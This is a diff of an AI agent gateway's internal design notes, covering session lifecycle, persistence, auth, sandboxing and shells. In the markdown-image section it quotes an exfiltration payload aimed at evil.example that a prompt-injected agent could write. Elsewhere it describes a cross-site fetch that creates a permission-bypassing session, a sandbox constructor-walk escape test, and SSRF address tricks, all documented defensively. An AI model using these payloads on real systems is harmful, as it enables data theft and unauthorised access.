@@ -126,7 +126,8 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
 
 - **A turn that ends under a standing approval must be deferred, not discarded.** Session status
   is purely edge-driven (no poll, no reconciliation), so a single dropped edge is permanent for the
-  session's life. If the turn-over guard returns early on the turn-over signal and `#settleApproval`
+  session's life. If the turn-over guard returns early on the turn-over signal and the settle
+  follow-up (`#afterApproval`, the claude runner's `after` hook on `RunnerCore`'s approval settle)
   then asserts `running` on the assumption an answered approval means work resumes, a session
   claims to run a turn that already produced its result, for hours, on every client at once (one
   runner field rendered three times). `#turnOverWhileBlocked` (confirmed in
@@ -279,7 +280,9 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
   set, so pinning the default home stays harmless. No analogue of `claudeSessionEnv`'s skip exists.
   Whether a keyring login is scoped per-home or per-user is unverified.
 - `@openai/codex` is pinned to an exact minor (`~0.155.1`; pre-1.0, JSON-RPC schema regenerates per
-  release). It's an optional peer of core (floor `~0.149.0`; absent -> profiles report unavailable,
+  release). It's an optional peer of core (`>=0.149.0 <0.156.0`: 0.149.0 is the oldest binary the runner
+  was verified against and the ceiling admits the `~0.155.1` the CLI ships and core develops
+  against; a `~` range there once excluded exactly that version; absent -> profiles report unavailable,
   creates throw the install message) and a real dependency of the CLI. The runner drives the binary
   directly with no SDK in between (`@openai/codex-sdk` is exec-only, no app-server client), resolved
   through the wrapper package to `vendor/<triple>/bin/codex`. Any change to `CodexRunner`'s spawn
@@ -454,7 +457,7 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
     be this session's own thread.** A sub-agent messaging the root back produces
     `{kind: 'interacted', agentThreadId: <the root thread>, agentPath: '/root'}` (measured in real
     rollouts, where `/root` is the main thread and `/root/<name>` an agent). The handler keys on the
-    item's `agentThreadId`, not on `#agentFor`, so without a guard the session opened an agent for
+    item's `agentThreadId`, not on `agentFor` (`codex/items.ts`), so without a guard the session opened an agent for
     itself and `agentName('/root')` published it as a sub-agent called **root**. The root is not an
     agent of itself: the item is dropped when `agentThreadId` is `#sdkSessionId`.
   - **Items and deltas are deliberately not filtered** - a sub-agent's work belongs in the
@@ -462,7 +465,7 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
   - **A child's items resolve through the agent's own `ItemScope`, never the root turn.** Agents
     outlive root turns by design, so the root's `#activeTurn` cannot be the gate: each `CodexAgent`
     carries its own nonce (its anchor id), tool-use latch and reasoning section index, and
-    `#itemContext` picks the agent's scope when `threadId` names one. Between root turns the root
+    `itemContext` (`codex/items.ts`) picks the agent's scope when `threadId` names one. Between root turns the root
     thread is heard for `subAgentActivity` only (a settle or a relabel); every other root item with
     no turn is still dropped. Pinned by the outlives-the-turn test in `core/test/codex-subagents.test.ts`.
 - **`WORKERDECK_CODEX_TRACE=<file>`** (`CODEX_TRACE_ENV` in `jsonrpc.ts`) dumps raw inbound
@@ -574,7 +577,7 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
   settle and `settle()` is first-wins: the thread's `turn/completed` supplies the richer report when
   it arrives first, the item-only path closes the row with an empty result (the item carries no
   text). Pinned by the two ordering tests in `core/test/codex-subagents.test.ts`.
-- **An unannounced non-root thread still gets an agent record.** `#agentFor` mints one for any
+- **An unannounced non-root thread still gets an agent record.** `agentFor` (`codex/items.ts`) mints one for any
   thread emitting items on the connection (codex runs threads of its own for review/compact, and a
   `subAgentActivity` could in principle be missed) - the claude tracker's nested-event fallback on a
   stronger signal. The minted record is label-less with its anchor `tool_use` authored on the spot,
@@ -623,6 +626,28 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
   to the family token for a server too old to send it. The match rule is written once per client
   (`ModelSelect.optionMatches`, Swift `ModelOption.matches`) and the two must stay identical.
 
+- **Engine knowledge the gateway needs goes through an adapter hook or a capability, never an
+  engine-name branch.** `EngineAdapter.sessionEnv(profile, base)` is how the claude adapter pins
+  `CLAUDE_CONFIG_DIR` (codex pins `CODEX_HOME` inside its own `createRunner`, so it declares no
+  hook); the session factory applies it after the host's `buildRunnerConfig` and keeps an unset
+  `env` unset when the hook hands `base` back. Fork support is `EngineCapabilities.forkSession`, not
+  `engine !== 'claude'`. A test that overrides an adapter through the `engines` option replaces the
+  hook with it: spread the real adapter (`{ ...getEngineAdapter('claude'), createRunner }`) or the
+  override loses the pin.
+- **All three runners share one lifecycle, `RunnerCore` (`core/src/lib/runner-core.ts`), held by
+  their common base `EngineRunner` (`core/src/lib/engine-runner.ts`).** It owns the event log and seq, the subscriber fan-out, the status machine (deduped
+  on the `(status, detail)` pair, never leaving `closed`/`failed`), the close/fail protocol and the
+  pending approvals, which ride `PendingRequestRegistry`. What differs per engine is a hook, not a
+  copy: `prepare` (codex marks history replay), `observe` and `settled` (claude's subagent tracker
+  before the fan-out, its checklist emit after it), `holdStatus` (claude's idle held while
+  compacting), and each approval's `respond`/`after` pair. `close()` denies every pending approval
+  (`resolvedBy: 'policy'`, `'Session closed'`) *before* the runner's teardown and before
+  `session_closed`, in every engine; the provider engine used to drop them silently. The one
+  exception is the claude runner's own end-of-stream close, which leaves approvals alone as it
+  always has. An approval deadline resolves `resolvedBy: 'timeout'` everywhere (the provider engine
+  reported `'client'`). The "questions are disabled" deny text is one constant,
+  `QUESTIONS_DISABLED_MESSAGE`, for claude and codex.
+
 ## Host instructions (the `instructions` seam)
 
 - **`instructions` is host authority and never rides the wire.** `CreateSessionRequest` has no
@@ -653,8 +678,8 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
   connect rebuilds the same options object, so the fresh thread carries the instructions; resume
   takes that same path. The provider's clear empties the message list, and the instructions were
   never in it.
-- **The text is never persisted.** `instructions` is in `EPHEMERAL_CONFIG_KEYS`, stripped from the
-  durable record like `env` and `extraOptions`. A dormant wake re-runs `buildRunnerConfig` against
+- **The text is never persisted.** `instructions` is not on the durable-config allowlist
+  (`toDurableRecord`), so it never reaches the durable record, like `env` and `extraOptions`. A dormant wake re-runs `buildRunnerConfig` against
   the stored config under the preserved id, so the host re-derives the same text: **`meta` is the
   durable public input, the instruction is the derived output.** A host that composes from state it
   did not put in `meta` loses it across a restart, and that is the trade, not an oversight - the
@@ -666,8 +691,8 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
 - **codex declares `developerInstructions` for real, verified at 0.155.1.** Acceptance alone proves
   nothing on this app-server, which ignores unknown `thread/start` fields rather than refusing them
   (the same trap as `dynamicTools`), so `pnpm smoke:codex --canary` sends a numeric value as well:
-  the refusal is what proves the field is in the schema. The floor stays the package's own
-  `~0.149.0`, and a binary predating the field would drop it silently.
+  the refusal is what proves the field is in the schema. The peer range still
+  admits 0.149.0 (`>=0.149.0 <0.156.0`), and a binary predating the field would drop it silently.
 
 ## Tool trust & the sandbox
 
@@ -683,6 +708,13 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
   CVE-2026-5752 failure shape, and `packages/sandbox/test/run-script.test.ts` pins it with a red
   team case walking `({}).constructor.constructor` to a `globalThis` that stays inside the guest
   realm.
+- **The guest's memory limit bounds one string, not how many it copies out.** Every `__host_*`
+  function reads its string arguments through `guestString`, which refuses a non-string (the globals
+  are callable directly, past the prelude's `String()` coercion) and checks the length *before* the
+  copy (`maxHostStringBytes`, 8 MiB). `createVfs` caps each file (8 MiB), the file count (1000) and
+  the total (32 MiB) in UTF-8 bytes, counting a host seed without ever refusing one, and throws a
+  `RangeError` the guest sees as an ordinary exception. Console output past `maxLogBytes` (1 MiB) is
+  dropped behind one `warn` marker line rather than thrown, so a chatty script still returns its value.
 - Host tools go in through `createEngineSession({ tools })` with a stated trust; contradictions are
   refused at assembly, not runtime: a `sandboxed` tool carrying `execute` would run in-process with
   the gateway's authority; an `authoritative` one without `execute` would park the turn on a call no
@@ -707,10 +739,16 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
   private/link-local denied per redirect hop; cross-host redirects surface a notice instead of
   following; 15-min page cache by URL), and the digest pass runs on the session's own model via
   `AiSdkRunner.generateDigest`, which adds its tokens into `#turnAccum`: any extra model call
-  outside that method loses tokens from the turn's accounting. One gap the layering does not close:
-  the guard resolves the hostname itself and then hands the URL to `fetch`, which resolves it
-  again, a DNS-rebinding TOCTOU this tier accepts rather than closes; an operator who needs the
-  check bound to the connection supplies `fetchImpl` with a pinned agent.
+  outside that method loses tokens from the turn's accounting. The default transport is
+  `guardedFetch` (node:http/https, never following a redirect), whose `lookup` refuses a private
+  answer at connect time, so a DNS-rebinding second answer cannot race the pre-check; a host that
+  supplies its own `fetchImpl` gets the pre-check only and owns the rest. `isPrivateAddress` parses
+  with `net.isIP` and judges every IPv6 form that embeds an IPv4 address by that address, because
+  WHATWG normalises `[::ffff:127.0.0.1]` to `[::ffff:7f00:1]`, which the old dotted-quad regex never
+  matched: IPv4-mapped, IPv4-translated, `::/96`, NAT64 `64:ff9b::/96` (and the `/48` local-use
+  block), 6to4 `2002::/16`, Teredo, link-, site-local and multicast. `QuickJsExecutor`'s default
+  `fetchText` reuses both: every redirect hop is re-checked against its allowlist *and* the
+  private-address guard, and the body is capped (`fetchMaxBytes`, 1 MiB).
 - `deliver_file` exists only when `onFileDelivered` is wired; `createEngineSession` grants it by
   default (`capabilities.deliverFiles: false` withholds it). Delivered files are downloadable only
   while the session lives: in-memory VFS.
@@ -824,8 +862,8 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
     vocabulary as the session list and `workerdeck guard`, deliberately not a second spelling of the
     busy set. Draining is a courtesy, never a correctness requirement: records are written
     continuously, so a hard stop already loses nothing.
-  - **Waking one re-runs `buildRunnerConfig`.** `env` is on `EPHEMERAL_CONFIG_KEYS` and never
-    reaches disk, so a claude profile's `CLAUDE_CONFIG_DIR` pin must be re-derived from the profile,
+  - **Waking one re-runs `buildRunnerConfig`.** `env` is not on the durable-config allowlist and
+    never reaches disk, so a claude profile's `CLAUDE_CONFIG_DIR` pin must be re-derived from the profile,
     not read back from the stored config.
   - A park's record is consumed on wake; a dormant one (and a live one) is refreshed in place,
     because the session will need it again next time the process dies. Consuming a live record
@@ -871,6 +909,17 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
     }`, and `PATCH /sessions/:id` calls `parking.touch()` because a rename emits no event and
     nothing else would trigger a save. A parked session 409s the PATCH: it has no runner to carry
     the change.
+- **A job's queue state follows the runner's park, never precedes it.** `onParking` is the veto
+  (the server wires `queue.canParkSession`, which commits nothing), `runner.park()` runs, and only a
+  snapshot it actually returned reaches `onParked` (`queue.onSessionParking`: slot freed, clock
+  stopped, `job_parked`). `AiSdkRunner.park()` may return `undefined`, and committing first used to
+  free a slot for a run that was still running, so a second job started beside it. An embedder that
+  wires `onParking` straight to `queue.onSessionParking` keeps the old order and the old race.
+- `#settled` (the executions already answered, for the `applied: false` idempotency reply) is
+  bounded at 4096 entries, oldest first: a long-lived gateway otherwise grew it by one per deferred
+  call forever. A duplicate delivery older than that answers 404, as it does after a restart.
+- A `discard` reached from the `session_closed` arm reports a failing `store.delete` through
+  `onError` (`phase: 'discard'`) instead of leaving an unhandled rejection.
 - Parking is a persistence boundary, not an ending: `park()` emits `status_changed: 'parked'` and
   never `session_closed`, the snapshot happens after that emit and keeps the seq counter (a
   rehydrated runner continuing at a reused seq is silently dropped by the reducer's and client's
@@ -882,12 +931,26 @@ change is the wrong one. Grouped by where they bite. Architecture lives in
   `ModelMessage` into `packages/server`). `registry.evict()` (not `remove()`) drops a parked runner
   without closing it. A rebuild that ignores `EngineRunnerContext.restore` produces a fresh id and
   is refused with a loud error rather than silently forgetting the task.
-- A durable `SessionStore` persists the record's config, and `toDurableRecord` drops four fields:
-  `queryFn`, `historyFn`, `extraOptions`, `env`. Two are functions JSON would eat silently; `env` is
-  credentials, and no store may ever hold it. Nothing is lost, because all four belong to the
-  Claude engine, which cannot park; a rebuilt provider session resolves credentials through
-  `createEngineRunner` from the live environment on every build. A host must resolve live values in
-  the factory, not smuggle them into `config` for its factory to read back.
+- A durable `SessionStore` persists the record's config through an **allowlist**, not a denylist:
+  `toDurableRecord` keeps the wire fields (`pickCreateSessionRequest`) plus the named host fields a
+  rebuild reads back (`epoch`, `pathToClaudeCodeExecutable`, `defaultApprovalTimeoutMs`,
+  `backfillHistory`, `createdByOperator`, `codexHome`, `codexPathOverride`, `maxSteps`,
+  `executionLimits`), and drops everything else: functions JSON would eat silently (`queryFn`,
+  `historyFn`, the `peers`/`shells` handles), `env` (credentials; no store may ever hold it),
+  `extraOptions`, `instructions`, `pricing`, and any key a host's `buildRunnerConfig` added. A new
+  host-side config key is therefore ephemeral until someone adds it to the list on purpose, which is
+  the direction a denylist got wrong. The allowlist is applied on save only: a record written under
+  the old denylist loads unchanged and is narrowed the next time it is saved. Nothing is lost for
+  credentials, because a rebuilt provider session resolves them through `createEngineRunner` from
+  the live environment on every build. A host must resolve live values in the factory, not smuggle
+  them into `config` for its factory to read back.
+  - **Request MCP servers are persisted whole, secrets included.** `mcpServers` is a wire field, and
+    a stdio server's `env` or an http server's `headers` routinely carry a token. A dormant wake
+    re-runs `buildRunnerConfig` from the stored request, so the woken session reconnects to exactly
+    the servers it was created with; stripping the secrets would wake it into servers that refuse
+    it. The store is 0600 under a 0700 dir for this reason among others. A host that must not have
+    MCP tokens on disk should declare those servers in its own config (resolved live) rather than
+    per request, or run without a durable store.
 - Store operations are serialized per session (`SessionParkManager#queue`); that ordering is
   load-bearing once writes are real I/O. `#park` must evict before the save completes, or an attach
   in between binds a client to an inert runner, leaving a window where the session is in neither the
@@ -953,7 +1016,7 @@ handover wrong.
   `#watches`, and why `release()` exists.
 - **Carry with `releaseSession`/`adoptSession`, never with `evict`/`register`.**
   `registry.register(runner)` re-attaches everything `onRegister` wires and nothing `createRunner`
-  wires: `parking.remember`, `parking.watch` and `watchAuthSource` all live outside that hook. A
+  wires: `parking.remember` and `parking.watch` live outside that hook. A
   session registered the bare way stops being written through (no record on a rename or a
   `conversation_reset`) and a client `close` never discards its record, so it comes back dormant on
   the next start. It tests green because the pre-reload record is still on disk;
@@ -985,6 +1048,12 @@ handover wrong.
 - **A carried session runs the code it was born with.** Keeping the child alive means keeping the
   `SessionRunner`/`CodexRunner` object, the old generation's `packages/core`. An engine or protocol
   edit reaches new sessions only; do not debug "my change had no effect" on a carried one.
+- **`RunnerCore` is a protected member of `EngineRunner`, so it never crosses the swap.** A carried
+  runner keeps the `EngineRunner` and `RunnerCore` of the generation that built it; the new
+  generation reaches it only through the `Runner` interface. Keep it that way: server code that reached for a runner's internals (or a
+  `RunnerCore` export) would read the old generation's class against the new one's expectations.
+  New adapter hooks (`sessionEnv`, `capabilities.forkSession`) are read off the new generation's
+  adapters at create time and never touch a carried runner.
 - **`registry.evict()` detaches as well as forgets**, and `onRegister`/`observe` may hand back a
   cleanup to make that possible. The hook is typed `unknown` rather than `void | (() => void)`
   because TypeScript forgives a stray return only against a bare `void`, and the narrower union
@@ -1018,11 +1087,15 @@ has the shape; these are the ways to get it wrong.
 - **`dynamicToolCall` is a mapped item now.** `item/started` draws the call under the tool's own
   name (`peers_send`, not `mcp__...`), `item/completed` settles it from `contentItems`. The
   canary's MAPPED set moved it; `functionCallOutput` stays unmapped for the reason recorded there.
-- **The runner holds a handle, not the directory.** `config.peers` is `peerDirectoryHandle()`,
-  which resolves `installPeerDirectory`'s process-wide slot (`Symbol.for`) on every call. That is
-  the hot-reload rule: a carried runner keeps the config it was born with, and a captured
-  directory would keep answering from the generation whose registry was emptied by the handover.
-  `peers` is in `EPHEMERAL_CONFIG_KEYS`; a function-bearing config must never reach a record.
+- **The runner holds a handle, not the directory.** `config.peers` is
+  `peerDirectoryHandle(own)`, which resolves on every call: first its own server's directory (the
+  `own` resolver), and only once that server has closed, `installPeerDirectory`'s process-wide slot
+  (`Symbol.for`). The fallback is the hot-reload rule: a carried runner keeps the config it was born
+  with, its generation has closed, and the slot now holds the generation that adopted it. The
+  own-first half is what keeps two `createWorkerServer` instances in one process apart: before it,
+  the second install silently re-pointed every runner of the first at the second's registry. The
+  shell directory (`shellDirectoryHandle(own)`) follows the same rule. `peers` is not on the
+  durable-config allowlist; a function-bearing config must never reach a record.
 - **Visibility is the sender's scope, not a client's.** `scopeMatches(from.scope, to.scope)`: a
   scoped session sees what a client carrying its scope would, an unscoped session sees everything.
   `authorizeSession` is *not* consulted, because it takes a principal and a session is not one;
@@ -1075,12 +1148,23 @@ has the shape; these are the ways to get it wrong.
 
 ## Server, profiles & auth
 
+- **`watchAuthSource` rides the registry's `onRegister`, so every door gets it.** It used to be
+  attached by hand at `POST /sessions`, the queue's `createRunner` and the hot-reload adopt, and the
+  parking wake (`#rebuild -> registry.register`) had none of the three, so a dormant or parked
+  session woken on a `requireApiKey` gateway could run on subscription credentials. Anything that
+  must hold for every live session belongs in `onRegister`, never beside one of the doors.
+  `register` skips a re-register of the same runner, which is what keeps it from attaching twice.
+  A different runner registered under a known id runs the old one's detachers first.
+- **The session route parser matches whole segments and refuses bad escapes.** `/v1/sessionsX` is
+  not session `X` (it 404s like any unknown path), and a malformed `%`-escape anywhere in a session
+  path is a 400 (`HttpError`), never the 500 an uncaught `URIError` used to produce.
 - **`writeFile`'s `mode` option applies only when the file is created**, so a 0600 write over an
-  existing file silently keeps whatever bits that file already had. Every secret-adjacent write in
-  `packages/cli` follows `writeFile` with an explicit `chmod`: `auth-key.ts` (regenerating over a
-  file it has just judged corrupt, precisely where the old mode is not ours), `auth-sessions.ts`
-  (temp path `${path}.${pid}.tmp`, reusable by a later run of the same pid), and `apns/devices.ts`
-  (rewritten on every device registration). The `chmod` reads redundant beside `mode` and is not.
+  existing file silently keeps whatever bits that file already had. `auth-key.ts` follows its
+  `writeFile` with an explicit `chmod` (regenerating over a file it has just judged corrupt,
+  precisely where the old mode is not ours), and every other state file goes through the server's
+  `lib/atomic-file.ts`, which chmods the temp file before the rename because the temp path
+  `${path}.${pid}.tmp` is reusable by a later run of the same pid. The `chmod` reads redundant
+  beside `mode` and is not.
 - **Runtime profile CRUD is gated on three separate things, and all three matter.** `profileStore`
   must be supplied (absent, 404 "profile management is not enabled"), the principal must carry
   `canManageProfiles` (the CLI grants it to operator principals only), and `allowedConfigDirRoots`
@@ -1122,6 +1206,15 @@ has the shape; these are the ways to get it wrong.
     `packages/server` itself never reads `?key=`; grep it before believing otherwise.
 - Cookie auth means ambient authority, so CSRF is live: WebSocket upgrades are exempt from CORS,
   which makes an explicit `Origin` check (not `SameSite` alone) the actual defense on an attach.
+- **A keyless gateway is ambient authority too, for every page the browser opens.** With no secret,
+  `createCliAuth` used to return the open principal before looking at the request at all, and
+  `readJsonBody` parsed any content type, so a `fetch(…, { mode: 'no-cors', body: '{"cwd":…,
+  "permissionMode":"bypassPermissions"}' })` from any site created a session on `127.0.0.1:8787`.
+  The keyless branch now applies the same origin verdict (foreign and `null` refused, absent
+  admitted as a non-browser client), plus `Sec-Fetch-Site: cross-site` on an unsafe method or an
+  upgrade, and the server refuses a non-JSON body (415). A safe cross-site GET is still admitted
+  with no Origin, because the extension's webview loads keyless-gateway images with a plain `<img>`,
+  and a browser cannot read that response cross-origin anyway.
 - **The login-session table is keyed by `HMAC-SHA256(secret, token)`, and that keying does three
   jobs at once**: do not simplify it back to a plain digest of the token. The table is mirrored to
   `<stateDir>/auth-sessions.json` (`createAuthSessionStore`) so a restart does not sign every
@@ -1152,7 +1245,8 @@ has the shape; these are the ways to get it wrong.
   which on macOS is the login Keychain, where `claude login` puts a claude.ai login. Pinning even
   the CLI's default `~/.claude` turns a working Mac login into "Not logged in, please run /login"
   (`apiKeySource` is `'none'` both ways, so it cannot discriminate). `claudeSessionEnv`
-  (`server/src/lib/profile-env.ts`) skips the pin when the baseline env already lands the CLI in the
+  (`core/src/engines/claude/session-env.ts`, which the gateway reaches only as the claude adapter's
+  `sessionEnv` hook) skips the pin when the baseline env already lands the CLI in the
   profile's dir: load-bearing for the auto-detected `default` profile on a Mac, and its converse
   holds too, a baseline carrying a different `CLAUDE_CONFIG_DIR` is still overridden by the profile,
   or two profiles collapse into one identity. A profile whose dir is not the default needs its own
@@ -1201,7 +1295,8 @@ has the shape; these are the ways to get it wrong.
   create and are not attached to. The notifier's webhook delivery is a deliberate near-copy of the
   queue's job-webhook delivery rather than a shared helper, because coupling them would let a change
   to job deliveries silently change session ones.
-- **Two CSRF details in `createCliAuth` sit beside the `Origin` rule above.** (a) The origin verdict
+- **Two CSRF details in `createCliAuth` sit beside the `Origin` rule above** (the verdicts live in
+  `packages/cli/src/auth/origin.ts`). (a) The origin verdict
   is tri-state (`absent`/`ok`/`foreign`) because absence means different things per call site: every
   current browser sends `Origin` on cross-site POSTs and on every WS handshake, so absent means a
   non-browser client carrying no ambient cookie. Login and logout allow absent-Origin (curl-style
@@ -1244,12 +1339,16 @@ has the shape; these are the ways to get it wrong.
   again at `#start`, since a durable adapter can hold a record written before the door did). Two
   lists keep it honest and both fail typecheck rather than drift: `CREATE_SESSION_REQUEST_KEYS` in
   protocol is built from a `Record<keyof CreateSessionRequest, true>`, so a wire field added
-  without an entry is a missing property; `HOST_ONLY_KEY_SET` in `create-vet.ts` is a `Record`
-  over `Exclude<keyof <the three configs>, keyof CreateSessionRequest>`, so a host-only field added
-  to any engine is a missing property and one promoted onto the wire is an excess one. **A key an
-  engine reads through an inline cast is invisible to that derivation** (`codexPathOverride` in
-  `codex/adapter.ts` is the one such key today) and has to be named by hand in
-  `UNDECLARED_HOST_ONLY_KEYS`; declaring the field is the better fix. The unknown-key policy is
+  without an entry is a missing property; `HOST_ONLY_KEY_TABLE` in `lib/host-only-keys.ts` is a
+  `Record` over `Exclude<keyof <the three configs>, keyof CreateSessionRequest>`, so a host-only
+  field added to any engine is a missing property and one promoted onto the wire is an excess one.
+  Each entry also says `'durable'` or `'transient'`, and that one table is both the create door's
+  400 list and `toDurableRecord`'s allowlist, so a new host-only key has to decide whether it
+  survives into a stored session record at the moment it is added. **A key an
+  engine reads through an inline cast is invisible to that derivation**, which is why no adapter
+  casts its config: `EngineAdapter<C>` types each adapter's `createRunner` on its own config
+  (`codexAdapter` reads `codexPathOverride` off `CodexAdapterConfig`), so every key an engine reads
+  is a declared field of one of the three configs. The unknown-key policy is
   deliberately two-tier. A known host-only name is a **400 naming it**: loud enough to diagnose an
   attack or an operator who put `extraOptions` in the wrong place. Any other unknown key is
   **dropped silently**, because `PROTOCOL_VERSION` is locked and an additive wire field is the
@@ -1304,9 +1403,15 @@ has the shape; these are the ways to get it wrong.
 
 - **Every `$` is a PTY with a tracked record; the transcript row, the REST routes and the card are
   views over it.** There is no pipe path, no interactive/non-interactive branch and no timer that
-  changes how a command runs. `services/shells.ts` is the registry (spawn, list, kill, artifact,
-  index, generation) and the only place this package spawns a shell; `services/process-tree.ts`
-  runs `ps` at kill time, the one other subprocess.
+  changes how a command runs. `services/shells.ts` is the registry (spawn, list, kill, generation)
+  and the only place this package spawns a shell, through `spawnShellChild` in `shell-env.ts` (the
+  env copy, `loginShell`, the `/dev/tty` wrapper). The per-entry mechanics are `shell-entry.ts`,
+  the on-disk artifact `shell-artifact.ts` (`LiveArtifact`/`StoredArtifact`), the index and its
+  by-generation reconcile `shell-index.ts`, the agent's `ShellDirectory` `shell-directory.ts`, and
+  the shared types `shell-types.ts`; `shells.ts` re-exports every name it used to define, so
+  importers never moved. `services/process-tree.ts` runs `ps` at kill time, the one other
+  subprocess. PTY shells are never carried across a hot reload (the old generation's `killAll`
+  ends them), so the split changes nothing there.
 - **It goes through nothing.** A Bash tool call raises a permission card and honours
   `disableBypassPermissions`; a `$` command has none of that, it is a shell on whatever the gateway
   process can reach, in the session's cwd. It is its own switch (`shell: { enabled }`, CLI
@@ -1398,13 +1503,12 @@ has the shape; these are the ways to get it wrong.
   `<stateDir>/shells/<sessionId>.json` are still the only way to find what is running.
 - **A shell reaches the session card only after `SHELL_PROMOTE_MS`, and the debounce is the
   client's clock, not the server's.** `decorate` puts every tracked shell on `SessionInfo.shells`;
-  `promotedShells(info, now)` is what decides which of them draw, and it is called with the poll's
-  `now` (web) or the push's (VS Code). So `$ ls` never lands on a card, `$ npm run dev` lands after
-  three seconds, a clean exit de-promotes at once, and a **reported** non-zero exit lingers
-  `SHELL_LINGER_MS` with its code. Reported is the load-bearing word: a killed shell and one
-  reconciled from a restart carry no `exitCode` at all, so a `!== 0` test called both of them
-  failures and parked each on the card for a minute in red. The linger is for a failure the
-  operator has not already been told about. The server's own filter in `decorate` is deliberately looser: it keeps the record,
+  `visibleShells(info, show, now)` is what decides which of them draw, and it is called with the
+  poll's `now` (web) or the push's (VS Code). So `$ ls` never lands on a card and `$ npm run dev`
+  lands after three seconds. Under the default `active` display an ended shell leaves the card at
+  once, failed or not; `all` keeps every ended one. (`promotedShells`, still exported, is the older
+  rule that let a **reported** non-zero exit linger `SHELL_LINGER_MS`; no card draws from it now.)
+  The server's own filter in `decorate` is deliberately looser: it keeps the record,
   the client decides the drawing. `sessionSteps` draws shells only when the caller passes the shell
   options, and the kill glyph only when it passes `onKill`, so a read-only surface cannot grow a
   kill button by accident.
@@ -1448,7 +1552,7 @@ has the shape; these are the ways to get it wrong.
   and a session a scoped principal made is never offered the write tools. A **job's** session has
   no principal on its record, so it is read-only too; giving jobs the write tools needs a slot on
   `JobInfo` and is not part of 4a. Both keys are in `HOST_ONLY_KEYS` (a body carrying them is a
-  400) and both, with `shells`, are in `EPHEMERAL_CONFIG_KEYS`: the `shells` handle used to
+  400) and none of the three is on the durable-config allowlist: the `shells` handle used to
   serialise as `{}` into a durable record, and a rebuild on a gateway with shells off would have
   kept it. `runShellTool` refuses a write tool unless the runner passed `{ write: true }`, so a
   call for a tool that was never declared is refused at the tool, not by absence.
@@ -1567,8 +1671,8 @@ has the shape; these are the ways to get it wrong.
   settled one. The row's sentence lives in one place per client (`compactionText` in
   `packages/ui/src/lib/format.ts`, `TermFmt.compaction` in the kit, pinned against each other by
   `TerminalTextTests`), since the terminal renderer measures the string it draws. An open
-  compaction also holds the session **busy**: `#setStatus` swallows an `idle` while
-  `#compactionId` is set and replays it on settle.
+  compaction also holds the session **busy**: the claude runner's `holdStatus` hook on `RunnerCore`
+  (`#holdIdleWhileCompacting`) swallows an `idle` while `#compactionId` is set and replays it on settle.
 - **The claude engine holds the flush across a slash command.** The CLI matches `/compact` and
   friends on message text, and a leading caveat block would break the match or lose the output, so
   `sendMessage` skips the flush for text matching `/^\s*\/[A-Za-z]/` and waits for the next plain
@@ -1623,6 +1727,12 @@ has the shape; these are the ways to get it wrong.
   are queued and appended rather than lost between the history and the live stream. A failed replay
   removes that proxy before it throws; leaving it in place left a buffer growing until the shell
   ended.
+- **The session event stream has a backpressure bound too.** Past `SESSION_SOCKET_BUFFERED_MAX`
+  (16 MiB of `ws.bufferedAmount`) a live event closes the socket with code 1013
+  (`SESSION_SOCKET_BACKPRESSURE_CODE`, reason `backpressure`) instead of queueing more; the client
+  reconnects with `afterSeq` as it does after any drop, and the close frame goes out behind the
+  buffered data, so each reconnect makes progress. The replay is exempt: it is bounded by the log,
+  and capping it would refuse every attach to a long session.
 - **Backpressure is retriable, and is not the shell ending.** `SHELL_SOCKET_BUFFERED_MAX` is 4 MiB
   of `ws.bufferedAmount`; crossing it sends `shell_detached { reason: 'backpressure' }` and
   detaches. The whole socket's backlog counts, transcript frames included, so attaching while a big
@@ -1964,6 +2074,14 @@ Five filters sit on the replay/live path, and compose. Keep them distinct:
   roots draws `image unavailable`, never a fetch against the page origin. `data:` images stay dropped
   by sanitize, as before. Both markdown renderers must pass `MARKDOWN_REHYPE_PLUGINS`: one that keeps
   Streamdown's defaults silently loses every local image.
+- **A remote markdown image is never loaded, only linked.** An `<img>` fetches the moment it renders,
+  so markdown an agent was talked into writing (`![](https://evil.example/?d=<secret>)`) would
+  exfiltrate with zero clicks. `MarkdownImage` renders any `http(s)` source other than the shielded
+  local host as a link reading `remote image, not loaded`, opened in a new tab on the user's click;
+  the dashboard's CSP and the extension's `img-src` would refuse the load anyway, and the link is the
+  honest rendering of that. Streamdown's harden step still allows every prefix: the component, not
+  the prefix list, is the gate, so an override of `img` in either renderer must keep going through
+  `MarkdownImage`.
 - **The image viewer borrows the loader's URL; it never owns one.** `ImageViewerProvider` holds only
   `{src, name}`, and the src is an object URL `useToolResultImages` may revoke on eviction while the
   viewer is open. The decoded picture survives that; its Download link does not. At a 64 MB budget
@@ -2028,13 +2146,13 @@ Five filters sit on the replay/live path, and compose. Keep them distinct:
   watermark; `activityCount` is every content block and is what sorting, "has anything happened at
   all," and dormancy read. Repointing either at the other undoes one of the two features. A session
   that ran forty tools and said nothing badges zero, on purpose.
-- **A watermark written before this shipped has no `prose`, and that absence reads as caught up.**
+- **A watermark persisted before prose counting has no `prose`, and that absence reads as caught up.**
   Reading it as 0 instead would badge every previously-visited session with its entire prose history
-  the first time it polls after an upgrade. Same rule in the Swift mirror (`Watermarks.swift`).
+  the first time it polls. Same rule in the Swift mirror (`Watermarks.swift`). There is no rows or
+  turns fallback: `proseCount` is in every 1.x gateway, and a record without it badges nothing.
 - **A caller that knows nothing about prose must pass `undefined`, never 0.** `Watermarks.mark`
-  keeps the previous `prose` when the argument is absent; a gateway without the field reports no
-  `proseCount`, so a mark of 0 would walk a real prose watermark back and re-badge everything the
-  operator had read. The field is additive on purpose and cost no `PROTOCOL_VERSION` bump.
+  keeps the previous `prose` when the argument is absent, so a mark of 0 would walk a real prose
+  watermark back and re-badge everything the operator had read.
 - **A `user_message` scores zero prose: the human wrote it, so it cannot be unread by them.**
   Counting it badged the sender's own prompt, because the watermark only advances when the polled
   sessions list ticks while the session view is mounted and visible: send, navigate away inside that
